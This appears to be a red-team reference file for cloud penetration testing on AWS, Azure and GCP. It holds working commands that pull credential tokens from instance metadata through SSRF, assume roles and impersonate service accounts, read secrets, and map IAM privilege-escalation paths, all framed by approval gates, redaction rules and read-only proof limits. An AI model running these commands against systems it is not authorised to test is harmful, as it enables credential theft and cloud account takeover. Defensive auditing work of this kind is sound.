# Cloud attack reference (AWS / Azure / GCP)
# Approval-gated. Read-only + benign proof. REDACT all creds/tokens in artifacts. In-scope accounts only.

## AWS
```
# Metadata (from an SSRF that reaches 169.254.169.254):
#   IMDSv1 (direct):  GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
#   IMDSv2 (token):   PUT /latest/api/token  (header X-aws-ec2-metadata-token-ttl-seconds: 21600)
#                     then GET with header X-aws-ec2-metadata-token: <token>
# Identity (benign proof):  aws sts get-caller-identity
# Enumerate (read-only):    aws iam list-attached-role-policies ; aws s3 ls ; enumerate-iam
# Privesc paths: iam:PassRole+lambda/ec2, iam:CreatePolicyVersion, sts:AssumeRole chains, iam:PutUserPolicy
# Storage: public S3 (aws s3 ls s3://bucket --no-sign-request), bucket policy, pre-signed URL leaks
# Tools: pacu (modules), ScoutSuite/prowler (read-only audit), weirdAAL
```

## Azure
```
# IMDS managed identity (SSRF):
#   GET http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
#      (header: Metadata: true)  -> access_token for the managed identity
# Identity: az account show ; az ad signed-in-user show
# Enumerate: az role assignment list ; az resource list ; MicroBurst, ROADtools (AAD), Stormspotter
# Storage: public blob containers, SAS token leaks, storage account keys
# Privesc: over-scoped managed identity, Contributor->Owner, Automation Account runbooks, Key Vault access
```

## GCP
```
# Metadata (SSRF):
#   GET http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
#      (header: Metadata-Flavor: Google)  -> service-account OAuth token
# Identity: gcloud auth list ; gcloud config list ; token -> https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=
# Enumerate: gcloud projects list ; gcloud iam ... (read-only) ; GCPBucketBrute
# Storage: public GCS buckets ; Privesc: iam.serviceAccounts.actAs, setIamPolicy, deploymentmanager, cloudfunctions
```

## Cross-provider checklist
- SSRF → metadata is the #1 web→cloud pivot (hand from `ssrf-cloud`). Note IMDSv2 requires the token PUT —
  an SSRF that can't set headers/methods often can't reach IMDSv2 (report honestly).
- Benign proof = identity call + ONE marker read. Never dump data stores. Redact every token.

---

## Extended arsenal — AWS STS & role-chaining (identity-proof only)

```
# Baseline: who am I right now (Arn / Account / UserId) — the universal AWS benign proof
aws sts get-caller-identity
# Which roles exist + can I assume them? (read-only trust-policy inspection)
aws iam list-roles --query 'Roles[].[RoleName,Arn]' --output text               # if iam:ListRoles
aws iam get-role --role-name <role> --query 'Role.AssumeRolePolicyDocument'     # read the trust policy
#   grep trust docs for Principal == my acct/user/role, "AWS":"*" (anyone), or an external account id.
# Assume a role, then the ONLY action is to prove WHO you became (never act beyond the identity call):
aws sts assume-role --role-arn arn:aws:iam::<acct>:role/<role> \
    --role-session-name redstrike-test --duration-seconds 900 \
    --query 'Credentials.[AccessKeyId,Expiration]' --output text                # REDACT Secret/SessionToken
AWS_ACCESS_KEY_ID=… AWS_SECRET_ACCESS_KEY=… AWS_SESSION_TOKEN=… aws sts get-caller-identity   # proves the hop
# Role CHAIN (A→B→C): walk ONE benign hop at a time, get-caller-identity after each. No resource actions.
# Decode-authorization on an AccessDenied (read-only, explains a denied call):
aws sts decode-authorization-message --encoded-message <msg> --query DecodedMessage
```

---

## Extended arsenal — AWS IAM privesc primitives (catalogued, benign-verify only)

Each row's escalation is APPROVAL-GATED and NOT auto-fired. The verification call only proves the
primitive is *reachable* (read-only); the escalation itself needs explicit approval + a single test
principal + revert (cleanup.md).

| Permission held | What the escalation enables | Single benign verification call (read-only) |
|---|---|---|
| iam:CreatePolicyVersion | new default policy version = self-grant `*` | `aws iam get-policy-version --policy-arn <a> --version-id <v>` |
| iam:SetDefaultPolicyVersion | roll back to an older over-permissive version | `aws iam list-policy-versions --policy-arn <a>` |
| iam:AttachUserPolicy / AttachRolePolicy | attach AdministratorAccess | `aws iam list-attached-user-policies --user-name <u>` |
| iam:PutUserPolicy / PutRolePolicy | inline-policy self-grant | `aws iam list-user-policies --user-name <u>` |
| iam:CreateAccessKey | mint keys for another user | `aws iam list-access-keys --user-name <u>` (count only) |
| iam:CreateLoginProfile / UpdateLoginProfile | set a console password on a user | `aws iam get-login-profile --user-name <u>` |
| iam:UpdateAssumeRolePolicy | rewrite a role's trust to include me | `aws iam get-role --role-name <r>` (read trust) |
| iam:AddUserToGroup | join an admin group | `aws iam list-groups-for-user --user-name <u>` |
| iam:PassRole + lambda:CreateFunction/Invoke | run code AS a passed role | `aws lambda list-functions` (enum only) |
| iam:PassRole + ec2:RunInstances | boot an instance w/ role, read its creds | `aws ec2 describe-instances --max-items 1` |
| iam:PassRole + glue/sagemaker/cloudformation | service-as-principal code exec | list that service's resources (read) |
| lambda:UpdateFunctionCode (priv role) | overwrite a privileged function | `aws lambda get-function --function-name <f>` |
| ssm:SendCommand (EC2 w/ role) | run commands on a managed instance | `aws ssm describe-instance-information` |
| sts:AssumeRole (over-broad trust) | hop to a higher-priv role | `aws sts get-caller-identity` after one assume |

```
# Offline, read-only way to spot these without firing anything: enumerate effective perms, then map to the table.
aws iam list-attached-role-policies --role-name <r> ; aws iam list-role-policies --role-name <r>
enumerate-iam --access-key <id> --secret-key <REDACTED>    # brute-maps which API calls succeed (read-only probes)
```

---

## Extended arsenal — AWS read-only service enum (Secrets Manager / SSM / SNS / SQS / Lambda)

```
### Secrets Manager — list names + metadata, retrieve only ONE scoped TEST secret (redacted)
aws secretsmanager list-secrets --query 'SecretList[].Name' --output text        # names only
aws secretsmanager describe-secret --secret-id <name>                            # metadata, no value
aws secretsmanager get-secret-value --secret-id <TEST-secret> \
   --query 'SecretString' --output text | wc -c                                  # length only -> REDACTED (len N, prefix 4)
```
```
### SSM Parameter Store — tree of names, flag SecureString, read only a TEST param
aws ssm describe-parameters --query 'Parameters[].[Name,Type]' --output text
aws ssm get-parameters-by-path --path / --recursive --query 'Parameters[].Name' --output text   # names only
aws ssm get-parameter --name <TEST-param> --with-decryption --query 'Parameter.Value' | wc -c    # len only -> REDACT
```
```
### Lambda env / SNS / SQS (inventory + config, not payloads)
aws lambda list-functions --query 'Functions[].FunctionName' --output text
aws lambda get-function-configuration --function-name <f> --query 'Environment.Variables'   # env leaks creds -> REDACT
aws sns list-topics ; aws sns list-subscriptions                                 # topic/sub inventory
aws sqs list-queues ; aws sqs get-queue-attributes --queue-url <u> --attribute-names All     # config, not messages
#   ReceiveMessage / Publish / Purge = impactful -> catalogue, approval-gate, DO NOT fire.
```

---

## Extended arsenal — AWS Organizations / cross-account trust / SSO (Identity Center)

```
### Organizations topology (read-only)
aws organizations describe-organization                                          # mgmt account id, feature set
aws organizations list-accounts --query 'Accounts[].[Id,Name]' --output text     # member accounts
aws organizations list-roots ; aws organizations list-organizational-units-for-parent --parent-id <root>
# Standard cross-account hop: a member trusts OrganizationAccountAccessRole from the mgmt account —
aws sts assume-role --role-arn arn:aws:iam::<member>:role/OrganizationAccountAccessRole \
   --role-session-name redstrike-test     # then get-caller-identity ONLY (one identity-proof hop)
```
```
### IAM Identity Center (SSO) enum (read-only)
aws sso-admin list-instances                                                     # SSO instance ARN + identity-store id
aws sso-admin list-permission-sets --instance-arn <arn>
aws sso-admin list-accounts-for-provisioned-permission-set --instance-arn <arn> --permission-set-arn <ps>
aws identitystore list-users --identity-store-id <id> --query 'Users[].UserName' --output text   # principal inventory
#   A device-auth / SSO access token is credential material -> REDACT; never replay beyond one identity call.
```

---

## Extended arsenal — AWS public-S3 read-only checks (--no-sign-request)

```
aws s3 ls s3://<bucket> --no-sign-request                                        # anonymous LIST (public-read ACL)
aws s3api get-bucket-acl    --bucket <bucket> --no-sign-request                   # grants: AllUsers / AuthenticatedUsers
aws s3api get-bucket-policy  --bucket <bucket> --no-sign-request                  # policy: public Allow statements
aws s3 cp s3://<bucket>/<ONE-benign-marker> - --no-sign-request | head -c 64      # read ONE object = reach proof
curl -s https://<bucket>.s3.amazonaws.com/                                        # XML listing if ACL public (no SDK)
#   a 301 PermanentRedirect body names the real region. Write-test = impactful: a single scoped TEST object ONLY
#   with approval, then delete it (cleanup.md). Catalogue, never mass-write.
```

---

## Extended arsenal — Azure tokens, managed identity & app registrations

```
### Tokens are per-RESOURCE — mint the right audience (REDACT every token)
az account get-access-token --resource https://management.azure.com/ --query expiresOn   # ARM control plane
az account get-access-token --resource https://graph.microsoft.com/  --query expiresOn   # Entra/Graph (directory)
az account get-access-token --resource https://vault.azure.net       --query expiresOn   # Key Vault data plane
az account get-access-token --resource https://storage.azure.com/    --query expiresOn   # Storage data plane
#   an ARM token does NOT work against Graph (and vice-versa) — enumerate each plane with its own token.
```
```
### Managed identity (IMDS on a VM/App) — enumerate, don't exfiltrate
curl -s -H Metadata:true \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | jq -r .access_token | wc -c                                                  # length only -> REDACT
#   user-assigned MI: add &client_id=<GUID> or &mi_res_id=<id>. Which identities are attached:
az vm identity show --name <vm> --resource-group <rg>
```
```
### App registrations / service principals (read-only)
az ad app list --query '[].{name:displayName,appId:appId}' -o table
az ad sp  list --all --query '[].{name:displayName,appId:appId}' -o table
az ad app credential list --id <appId>                                           # secret/cert METADATA (not values)
#   app w/ client secret + high Graph perms = privesc path -> catalogue; a secret VALUE is never stored raw.
```

---

## Extended arsenal — Azure read-only storage, Key Vault & RBAC

```
### Storage (public blob + SAS awareness) — read-only
az storage account list --query '[].{name:name,rg:resourceGroup}' -o table
az storage container list --account-name <acct> --auth-mode login -o table
az storage blob list --account-name <acct> --container-name <c> --auth-mode login -o table   # names only
curl -s "https://<acct>.blob.core.windows.net/<container>?restype=container&comp=list"        # XML list if public
#   a SAS token in a URL = scoped credential -> REDACT (len+prefix); note expiry/perms, don't replay broadly.
```
```
### Key Vault (data plane) — list, read ONE test secret
az keyvault list --query '[].name' -o tsv
az keyvault secret list --vault-name <vault> --query '[].name' -o tsv            # secret NAMES only
az keyvault secret show --vault-name <vault> --name <TEST-secret> --query value -o tsv | wc -c   # len only -> REDACT
az keyvault key list --vault-name <vault> ; az keyvault certificate list --vault-name <vault>    # inventory
```
```
### RBAC role assignments (who-can-do-what, read-only)
az role assignment list --all \
  --query '[].{principal:principalName,role:roleDefinitionName,scope:scope}' -o table
az role definition list --custom-role-only true --query '[].roleName' -o tsv     # custom roles (often over-scoped)
#   flag Owner / Contributor / User Access Administrator at subscription or MG scope on a non-admin principal.
```

---

## Extended arsenal — Entra ID (AAD) enumeration & dynamic-group awareness

```
### Directory enum — Graph token, read-only (GET only)
roadrecon auth -u <user> ; roadrecon gather ; roadrecon dump                     # offline directory db (roadtools-class)
az rest --method GET --url 'https://graph.microsoft.com/v1.0/users?$select=userPrincipalName,id&$top=10'
az rest --method GET --url 'https://graph.microsoft.com/v1.0/groups?$select=displayName,id'
az rest --method GET --url 'https://graph.microsoft.com/v1.0/directoryRoles'
az rest --method GET --url 'https://graph.microsoft.com/v1.0/policies/conditionalAccessPolicies'   # CA policy (if permitted)
```
```
### Dynamic-group awareness (self-service privesc surface)
# A dynamic group whose membership rule keys on a USER-EDITABLE attribute (department, otherMails, …) lets a
# principal who can edit that attribute auto-join the group (and inherit its role).
az rest --method GET \
  --url "https://graph.microsoft.com/v1.0/groups?\$filter=groupTypes/any(c:c%20eq%20'DynamicMembership')"
#   catalogue the rule + which attribute is attacker-settable; do NOT modify a real user's attributes. Approval-gated.
```

---

## Extended arsenal — GCP service-account impersonation & actAs chains

```
### Impersonation (identity-call proof only)
gcloud auth list                                                                 # active principal
gcloud iam service-accounts get-iam-policy <sa>@<proj>.iam.gserviceaccount.com   # who has tokenCreator/actAs on the SA
gcloud auth print-access-token --impersonate-service-account=<sa>@<proj>.iam.gserviceaccount.com | wc -c   # len -> REDACT
gcloud --impersonate-service-account=<sa>@<proj>.iam.gserviceaccount.com projects list --limit 1   # acts AS the SA (read)
#   actAs chain (A→B→C): walk ONE benign hop at a time, prove each with a read/identity call. No mutations.
```

---

## Extended arsenal — GCP token introspection, GCS & recursive metadata

```
### Token introspection (whose token, what scopes)
curl -s "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$(gcloud auth print-access-token)"
#   keep only scopes + SA email as evidence; REDACT the raw token.
```
```
### Read-only GCS
gsutil ls                                                                        # buckets I can see
gsutil iam get gs://<bucket>                                                      # allUsers/allAuthenticatedUsers = public
curl -s "https://storage.googleapis.com/storage/v1/b/<bucket>/o"                  # anonymous list if public
gsutil cp gs://<bucket>/<ONE-marker> - | head -c 64                              # read ONE object = reach proof
```
```
### Recursive instance-metadata tree (on-box or via SSRF)
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=json"  # holds token/scopes/ssh-keys/kube-env -> REDACT
```
```
### Org-policy & Workload Identity awareness (read-only)
gcloud resource-manager org-policies list --project <proj>                       # guardrails in effect
gcloud iam workload-identity-pools list --location global --project <proj>       # federation entry points
#   a mis-scoped WIF / GKE Workload-Identity mapping = token-for-SA without a key -> catalogue; prove with an identity call.
```

---

## Extended arsenal — cross-provider "one benign identity call" matrix

| Provider / state | Credential in hand | ONE benign call that PROVES access | Do NOT (impact) |
|---|---|---|---|
| AWS | access key / session token | `aws sts get-caller-identity` | enum/alter resources without approval |
| AWS (assumed role) | minted STS creds | same, under the new profile | act beyond the identity call |
| Azure | MI / user token | `az account show` / `az ad signed-in-user show` | write to ARM/Graph |
| Azure (Graph) | Graph token | `az rest --method GET --url .../v1.0/me` | directory writes |
| GCP | user / SA token | `gcloud auth list` + tokeninfo email | act on resources |
| GCP (impersonated) | impersonated token | `… projects list --limit 1 --impersonate-…` | mutate project state |

---

## Extended arsenal — redaction & benign-proof protocol (cloud)

- Any recovered key / token / secret / SAS / connection-string → record ONLY as `REDACTED (len N, prefix 4)`;
  never commit a live value; delete transcripts that captured one.
- Proof ceiling = ONE identity/echo call per credential + at most ONE scoped TEST-resource read (redacted).
  No bulk listing of data stores, no resource mutation.
- Privesc primitives are CATALOGUED (table above) — the verification call proves reachability only; the
  escalation itself is approval-gated, single-test-principal, reverted.
- Destructive / DoS (delete bucket, detach policy, stop instances, purge queue) = CATALOGUED-NOT-FIRED:
  describe feasibility + how to assess it; never provide a turnkey command.
- Single test principal + single test host. Record every artifact created (role session, test object, test
  secret) and revert it (cleanup.md).
